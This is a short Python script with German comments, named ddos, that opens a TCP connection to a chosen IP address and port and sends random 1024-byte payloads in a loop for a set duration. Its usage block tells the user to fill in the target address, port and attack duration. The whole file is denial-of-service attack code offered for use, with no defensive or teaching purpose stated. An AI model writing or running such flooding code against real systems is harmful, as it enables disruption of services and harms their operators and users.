import socket
import random
import time

def ddos(target_ip, target_port, duration):
    # Erstelle ein Socket-Objekt
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Verbinde mit dem Ziel-IP und Port
    sock.connect((target_ip, target_port))

    # Setze die Dauer des Angriffs in Sekunden
    end_time = time.time() + duration

    # Hauptschleife zum Senden der Pakete
    while time.time() < end_time:
        # Generiere zufällige Payload-Daten
        payload = random._urandom(1024)

        # Sende das Paket an das Ziel
        sock.send(payload)

    # Schließe die Verbindung
    sock.close()

# Verwendung
target_ip = "127.0.0.1"  # Ersetze mit der Ziel-IP-Adresse
target_port = 80         # Ersetze mit der Ziel-Portnummer
attack_duration = 60     # Ersetze mit der gewünschten Angriffsdauer in Sekunden

ddos(target_ip, target_port, attack_duration)
